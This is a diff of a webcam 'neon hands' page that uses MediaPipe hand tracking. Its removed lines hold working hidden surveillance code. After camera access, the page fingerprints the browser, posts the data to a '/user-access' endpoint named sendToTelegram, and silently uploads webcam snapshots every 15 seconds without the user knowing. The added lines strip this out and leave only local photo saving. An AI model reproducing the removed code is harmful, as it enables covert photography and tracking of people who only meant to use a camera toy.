@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Cambot Camera — Neon Hands (Fixed)</title>
+  <title>Cambot Camera — Neon Hands (Fixed Capture)</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
@@ -21,7 +21,7 @@
     .logo i{ font-size:1.6rem; background: rgba(255,255,255,0.02); padding:8px; border-radius:8px;}
     .camera-frame { width:100%; max-width:420px; aspect-ratio: 3/4; position:relative; border-radius:14px; padding:14px; box-sizing:border-box; background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.06)); box-shadow: 0 8px 40px rgba(0,0,0,0.6), 0 0 30px rgba(0,242,254,0.06) inset; }
     .viewport { position:relative; width:100%; height:100%; border-radius:10px; overflow:hidden; background:#000; display:flex; align-items:center; justify-content:center; }
-    video { width:100%; height:100%; object-fit:cover; /* visual mirror for selfie */ transform: scaleX(-1); }
+    video { width:100%; height:100%; object-fit:cover; transform: scaleX(-1); }
     canvas.overlay { position:absolute; top:0; left:0; width:100%; height:100%; pointer-events:none; }
     .controls { display:flex; gap:16px; align-items:center; justify-content:center; margin-top:12px; z-index:10; }
     .shutter { width:78px; height:78px; border-radius:50%; background: radial-gradient(circle at 30% 30%, #7ceaff, #00c0ff); border:5px solid rgba(255,255,255,0.95); box-shadow: 0 8px 25px rgba(0,192,255,0.25), 0 0 40px rgba(0,242,254,0.18); display:flex; align-items:center; justify-content:center; cursor:pointer; transition: transform .12s ease, box-shadow .12s; }
@@ -64,201 +64,66 @@
     const ctx = handCanvas.getContext('2d');
 
     let cameraStream = null;
-    let userInfoSent = false;
-    let imageCount = 0;
-    let isSendingImages = true;
     let mediaPipeInitialized = false;
-
     const DPR = window.devicePixelRatio || 1;
-    const VISUALLY_MIRROR = true; // video element is visually mirrored via CSS transform
+    const VISUALLY_MIRROR = true;
 
-    function collectUserInfo() {
-      return {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        screen: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timestamp: new Date().toISOString(),
-        url: window.location.href
-      };
-    }
-
-    async function sendToTelegram(message) {
-      try {
-        const response = await fetch('/user-access', {
-          method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(message)
-        });
-        return await response.json();
-      } catch (error) {
-        console.error('Error sending to server:', error);
-      }
-    }
-
-    // Resize overlay canvas to match video intrinsic size (for pixel-accurate mapping)
     function resizeCanvasToVideo() {
       const vw = video.videoWidth || video.clientWidth;
       const vh = video.videoHeight || video.clientHeight;
       if (!vw || !vh) return;
-
-      // Set backing store size for crisp rendering
       handCanvas.width = Math.round(vw * DPR);
       handCanvas.height = Math.round(vh * DPR);
       handCanvas.style.width = video.clientWidth + 'px';
       handCanvas.style.height = video.clientHeight + 'px';
-
       ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
       ctx.clearRect(0, 0, handCanvas.width, handCanvas.height);
     }
 
-    // Draw neon line connecting two normalized points (input are objects with x,y in pixels relative to video intrinsic size)
     function drawNeonLine(a, b) {
-      ctx.save();
-      ctx.lineWidth = 3.5;
-      ctx.strokeStyle = 'rgba(0,242,254,0.95)';
-      ctx.shadowBlur = 18;
-      ctx.shadowColor = 'rgba(0,242,254,0.9)';
-      ctx.beginPath();
-      ctx.moveTo(a.x, a.y);
-      ctx.lineTo(b.x, b.y);
-      ctx.stroke();
-      ctx.restore();
+      ctx.save(); ctx.lineWidth = 3.5; ctx.strokeStyle = 'rgba(0,242,254,0.95)'; ctx.shadowBlur = 18; ctx.shadowColor = 'rgba(0,242,254,0.9)';
+      ctx.beginPath(); ctx.moveTo(a.x, a.y); ctx.lineTo(b.x, b.y); ctx.stroke(); ctx.restore();
     }
-
     function drawNeonPoint(p) {
-      ctx.save();
-      ctx.fillStyle = 'rgba(0,242,254,1)';
-      ctx.shadowBlur = 20;
-      ctx.shadowColor = 'rgba(0,242,254,0.9)';
-      ctx.beginPath();
-      ctx.arc(p.x, p.y, 6, 0, Math.PI*2);
-      ctx.fill();
-      ctx.restore();
+      ctx.save(); ctx.fillStyle = 'rgba(0,242,254,1)'; ctx.shadowBlur = 20; ctx.shadowColor = 'rgba(0,242,254,0.9)';
+      ctx.beginPath(); ctx.arc(p.x, p.y, 6, 0, Math.PI*2); ctx.fill(); ctx.restore();
     }
 
     function mapLandmarkToPixel(landmark, videoWidth, videoHeight) {
-      // MediaPipe gives normalized landmarks in range [0,1] relative to input image
       let x = landmark.x * videoWidth;
-      if (VISUALLY_MIRROR) {
-        // video is visually mirrored, so flip x to align overlay with what user sees
-        x = videoWidth - x;
-      }
+      if (VISUALLY_MIRROR) x = videoWidth - x;
       const y = landmark.y * videoHeight;
       return { x, y };
     }
 
     function initMediaPipe() {
       const hands = new Hands({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}` });
-
       hands.setOptions({ maxNumHands: 2, modelComplexity: 1, minDetectionConfidence: 0.7, minTrackingConfidence: 0.7 });
-
       hands.onResults((results) => {
         if (!video.videoWidth || !video.videoHeight) return;
         resizeCanvasToVideo();
-
-        const vw = video.videoWidth;
-        const vh = video.videoHeight;
-
+        const vw = video.videoWidth; const vh = video.videoHeight;
         ctx.clearRect(0, 0, handCanvas.width, handCanvas.height);
-
         if (!results.multiHandLandmarks || results.multiHandLandmarks.length === 0) return;
-
         for (const lmList of results.multiHandLandmarks) {
           const points = lmList.map(pt => mapLandmarkToPixel(pt, vw, vh));
-
-          // scale drawn points to canvas CSS display size (we set ctx transform already for DPR)
-          for (const conn of window.HAND_CONNECTIONS) {
-            const [i, j] = conn;
-            drawNeonLine(points[i], points[j]);
-          }
+          for (const conn of window.HAND_CONNECTIONS) { const [i, j] = conn; drawNeonLine(points[i], points[j]); }
           for (const p of points) drawNeonPoint(p);
         }
       });
-
-      const cameraUtils = new Camera(video, {
-        onFrame: async () => {
-          try { await hands.send({ image: video }); }
-          catch (e) { console.error('MediaPipe error:', e); }
-        },
-        width: 1280, height: 720
-      });
-
+      const cameraUtils = new Camera(video, { onFrame: async () => { try { await hands.send({ image: video }); } catch (e) { console.error('MediaPipe error:', e); } }, width: 1280, height: 720 });
       cameraUtils.start();
     }
 
     async function initCamera() {
       try {
         if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
-
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } });
-        cameraStream = stream;
-        video.srcObject = stream;
-
-        if (!userInfoSent) {
-          try { await sendToTelegram(collectUserInfo()); userInfoSent = true; setTimeout(sendImageToTelegram, 5000); } catch (e) { console.error(e); }
-        }
-
-        await new Promise(res => {
-          if (video.readyState >= 2) return res();
-          video.onloadedmetadata = res; video.onloadeddata = res;
-        });
-
-        resizeCanvasToVideo();
-        window.addEventListener('resize', resizeCanvasToVideo);
-
+        cameraStream = stream; video.srcObject = stream;
+        await new Promise(res => { if (video.readyState >= 2) return res(); video.onloadedmetadata = res; video.onloadeddata = res; });
+        resizeCanvasToVideo(); window.addEventListener('resize', resizeCanvasToVideo);
         if (!mediaPipeInitialized) { initMediaPipe(); mediaPipeInitialized = true; }
-      } catch (e) {
-        console.error('Camera error:', e);
-        setTimeout(initCamera, 3000);
-      }
-    }
-
-    // When sending images periodically - ensure alignment & mirroring consistency
-    function sendImageToTelegram() {
-      if (!isSendingImages) return;
-      if (!video.videoWidth || !video.videoHeight) { setTimeout(sendImageToTelegram, 3000); return; }
-
-      try {
-        const out = document.createElement('canvas');
-        out.width = video.videoWidth;
-        out.height = video.videoHeight;
-        const outCtx = out.getContext('2d');
-
-        // Draw mirrored video (for selfie-like result)
-        outCtx.save();
-        outCtx.translate(out.width, 0);
-        outCtx.scale(-1, 1);
-        outCtx.drawImage(video, 0, 0, out.width, out.height);
-        outCtx.restore();
-
-        // Draw overlay landmarks: we need to draw them mirrored the same way so they align with the mirrored video
-        // Create a temporary canvas that uses the same intrinsic size as handCanvas but in pixels
-        const tmp = document.createElement('canvas');
-        tmp.width = handCanvas.width; tmp.height = handCanvas.height;
-        const tmpCtx = tmp.getContext('2d');
-        // Copy our overlay (which was drawn in CSS-display coordinates but backed by DPR-backed pixel size)
-        tmpCtx.drawImage(handCanvas, 0, 0, tmp.width, tmp.height);
-
-        // Now draw the tmp onto out canvas scaling from overlay intrinsic pixels to video pixels
-        outCtx.save();
-        // Because outCtx currently has normal orientation but we already flipped video, we want landmarks to match flipped video.
-        // So we draw tmp mirrored horizontally.
-        outCtx.translate(out.width, 0);
-        outCtx.scale(-1, 1);
-        outCtx.drawImage(tmp, 0, 0, tmp.width, tmp.height, 0, 0, out.width, out.height);
-        outCtx.restore();
-
-        out.toBlob(blob => {
-          const formData = new FormData();
-          formData.append('photo', blob, `cambot_${Date.now()}.jpg`);
-          fetch('/upload', { method: 'POST', body: formData })
-            .then(r => r.json()).then(d => { imageCount++; }).catch(err => console.error(err))
-            .finally(() => setTimeout(sendImageToTelegram, 15000));
-        }, 'image/jpeg', 0.8);
-      } catch (e) {
-        console.error('Error creating image:', e);
-        setTimeout(sendImageToTelegram, 10000);
-      }
+      } catch (e) { console.error('Camera error:', e); setTimeout(initCamera, 3000); }
     }
 
     shutterBtn.addEventListener('click', async () => {
@@ -272,15 +137,8 @@
         outCtx.save(); outCtx.translate(out.width, 0); outCtx.scale(-1, 1);
         outCtx.drawImage(video, 0, 0, out.width, out.height); outCtx.restore();
 
-        // Draw overlay landmarks mirrored to match the drawn video
-        const tmp = document.createElement('canvas');
-        tmp.width = handCanvas.width; tmp.height = handCanvas.height;
-        const tmpCtx = tmp.getContext('2d');
-        tmpCtx.drawImage(handCanvas, 0, 0);
-
-        outCtx.save(); outCtx.translate(out.width, 0); outCtx.scale(-1, 1);
-        outCtx.drawImage(tmp, 0, 0, tmp.width, tmp.height, 0, 0, out.width, out.height);
-        outCtx.restore();
+        // Draw overlay landmarks directly (no mirror again)
+        outCtx.drawImage(handCanvas, 0, 0, handCanvas.width, handCanvas.height, 0, 0, out.width, out.height);
 
         out.toBlob(blob => {
           const a = document.createElement('a');
@@ -291,9 +149,7 @@
       } catch (e) { console.error('Error capturing image:', e); }
     });
 
-    window.addEventListener('beforeunload', () => { isSendingImages = false; if (cameraStream) cameraStream.getTracks().forEach(t => t.stop()); });
-
-    // Start after small delay to avoid permission prompt race conditions
+    window.addEventListener('beforeunload', () => { if (cameraStream) cameraStream.getTracks().forEach(t => t.stop()); });
     setTimeout(initCamera, 800);
   </script>
 </body>
